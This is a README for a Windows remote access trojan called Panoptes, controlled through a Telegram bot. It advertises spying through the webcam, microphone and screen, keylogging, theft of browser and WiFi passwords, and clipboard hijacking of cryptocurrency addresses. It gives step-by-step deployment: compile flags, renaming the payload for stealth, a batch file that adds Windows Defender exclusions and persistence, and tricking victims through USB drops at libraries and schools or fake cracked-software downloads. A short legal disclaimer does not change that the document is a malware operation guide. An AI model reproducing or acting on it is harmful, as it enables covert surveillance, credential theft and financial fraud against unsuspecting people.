# 🕵️‍♂️ Panoptes - Remote Access Toolkit

A comprehensive remote access toolkit with Telegram-based C&C (Command and Control), designed for monitoring and data exfiltration.

## 🔍 Overview

Panoptes is a powerful spying tool that gives you full control over an infected computer. You can watch the user in real-time through their webcam and microphone, see their screen, and steal their passwords, files, and browsing history. It also lets you run commands on the system and can even hijack cryptocurrency payments. All control is managed through your own Telegram Bot.

The **Quick Deployment** method requires the computer to have **Administrator access**, as the toolkit itself has no built-in evasion techniques. It relies entirely on the `.bat` file being run with elevated privileges to automatically add persistence and add the main payload to the Windows Defender exclusion path. You can pull this off by either using **social engineering** to trick a user into running the `.bat` file with Admin rights, or by manually installing it via a normal **USB** or a **Rubber Ducky** in places with vulnerable computers, such as tech stores in malls or libraries and schools, where an admin rights user account is most of the time open.

The **Advanced Deployment** method is for those with their own AV evasion techniques. You compile a **custom executable** that bypasses antivirus software. This method can be used by making your software seem legitimate, making it much easier to trick a user into downloading and running it, or you can also manually install this on computers via **USB** or **Rubber Ducky** since it **doesn't require admin rights** to evade antivirus. However, since there is no ``.bat`` file, you need to add your own **persistence mechanism** into the **main Python file** before compiling the final payload.

## 🚀 Deployment Methods

### Method 1: Quick Deployment (Admin Required)
```
custom_name.tmp + deploy.bat
```
<br>

**Step 1: Install Required Dependencies**

Open command prompt as administrator and run:

```
pip install requests pycryptodome opencv-python pillow pyperclip pynput sounddevice psutil win32crypt nuitka
```

If any module is missing, install it individually:

```
pip install "module name"
pip install requests  
pip install pycryptodome
```

<br>

**Step 2: Compile with Nuitka**

Compile to create a standalone executable:

```
nuitka --onefile --follow-imports --windows-disable-console --include-package=requests --include-package=pycryptodome --include-package=cv2 --include-package=PIL --include-package=pyperclip --include-package=pynput --include-package=sounddevice --include-package=psutil --include-package=win32crypt main.pyw
```

This will create a `.exe` file without console window.

<br>

**Step 3: Rename File for Stealth**

Rename the compiled file (Command Prompt):

```
ren system.exe custom_name.tmp
```

*Renaming to `.tmp` makes it look less suspicious than a random `.exe` file*

<br>

**Step 4: Update Batch File**

Update `deploy.bat` on line 16 with your new file name:

```
set "SOURCE_FILE=%~dp0custom_name.tmp"
```

<br>

**Step 5: Deploy**

Add both files to the same folder and run `deploy.bat` as Administrator

- Batch file automatically adds your file to Windows Defender exclusions
- Creates persistence via scheduled tasks/registry  
- Executes your payload with full system privileges
  
**Perfect for:** USB drops on open vulnerable computers *(Ex: libraries, malls, schools)* or social engineering where you convince someone to run the `.bat` as admin.

<br>

### Method 2: Advanced Custom Deployment

```
custom_app.exe (Packed / Obfuscated)
```

**How it works:**
- Modify ```main.pyw``` to create a unique, undetectable executable
- Replace ```"TOKEN"``` & ```"ID``` with your actual Telegram Bot Token and ID
- Use packing, obfuscation, file pumping, code signing and other evasion techniques to bypass AV 
- Since your compiled executable bypasses antivirus, you can disguise it as any legitimate program
- Then deploy your payload through any method - it appears as a clean, trusted file

**Perfect for:** Fake software downloads *(Ex: YouTube "cracked software" tutorials)*, email attachments, or any scenario where you need a clean, undetectable file that appears legitimate to the end user.

<br>

## 🛠️ Features

### 🎥 Real-Time Surveillance
- **Live Screen Streaming** - Real-time desktop monitoring
- **Webcam Access** - Live camera feed and photo capture
- **Microphone Recording** - Audio surveillance and live streaming
- **Screen Recording** - Capture desktop activity

### ⌨️ Input Monitoring
- **Keylogger** - Real-time keystroke capture with periodic reports
- **Clipboard Monitoring** - Automatic crypto address swapping
- **Process Monitoring** - System activity tracking

### 📁 Data Extraction
- **Browser Data** - Passwords, history, downloads from multiple browsers
- **File System Access** - Remote file browsing and downloading
- **WiFi Credentials** - Saved network passwords
- **System Information** - User, computer, and network details

### 🔧 System Control
- **Process Management** - View and terminate running processes
- **Remote Commands** - Execute system commands
- **User Interaction** - Display messages and fake errors
- **System Control** - Shutdown, restart, and persistence management

### 💰 Financial Tools
- **Crypto Address Swapping** - Automatic clipboard hijacking for multiple cryptocurrencies
- **Custom Address Management** - Set replacement addresses for BTC, ETH, SOL, and more
  
<br>

## 📋 Command Reference

### Surveillance Commands
```
/start - Initialize bot connection
/screenshot - Capture desktop screenshot
/picture - Take webcam photo
/audio [seconds] - Record microphone
/record [seconds] - Record screen activity
/live screen - Start live desktop stream
/live camera - Start live webcam stream
/live mic - Start live microphone stream
/stop - Stop all active streams
```

### System Commands
```
/system - Get system information
/location - Get approximate geolocation
/processes - List running processes
/kill [pid] - Terminate process
/wifi - Export saved WiFi passwords
/clipboard - Show clipboard history
```

### Data Extraction
```
/steal - Extract browser login data
/history - Get browser history
/downloads - Get download history
/files [path] - Browse file system
/download [path] - Download remote file
```

### Control Commands
```
/msg [text] - Display message to user
/error - Show fake error message
/shutdown - Force system shutdown
/restart - Force system restart
/crypto - Show crypto addresses
/swap [crypto] [address] - Set swap address
```

### Monitoring Commands
```
/keylogger on - Start keystroke monitoring
/keylogger off - Stop keylogger
```

<br>

## 🔧 Technical Details

### Persistence Mechanisms
- Scheduled tasks creation
- Registry run keys
- Service installation

### Stealth Features
- Process name spoofing
- Temp folder operation
- AV exclusion automation

### Communication
- Telegram bot API integration
- File upload/download capabilities
- Real-time command executio
  
<br>

## 📊 Performance

- **Real-time streaming**: 3-second intervals
- **Keylogger updates**: 30-second reports
- **File operations**: 50MB maximum upload
- **Process monitoring**: 25-process display limit
  
<br>

## 🔒 Security Considerations

- Operates from temporary directory
- Uses system-standard communication
- Implements error handling for stability
- Includes cleanup mechanisms
  
<br>

## ⚖️ Legal Disclaimer

This tool is designed for authorized security testing, educational purposes, and research. Users are solely responsible for complying with all applicable laws and obtaining proper authorization before deployment. The developers assume no liability for misuse.
  
<br>

## 🔬 Educational Value

This project demonstrates:
- Remote access tool architecture
- Multiple persistence techniques
- AV evasion strategies
- Real-time surveillance capabilities
- Telegram C&C implementation
- Social engineering deployment vectors
- Physical security assessment methods
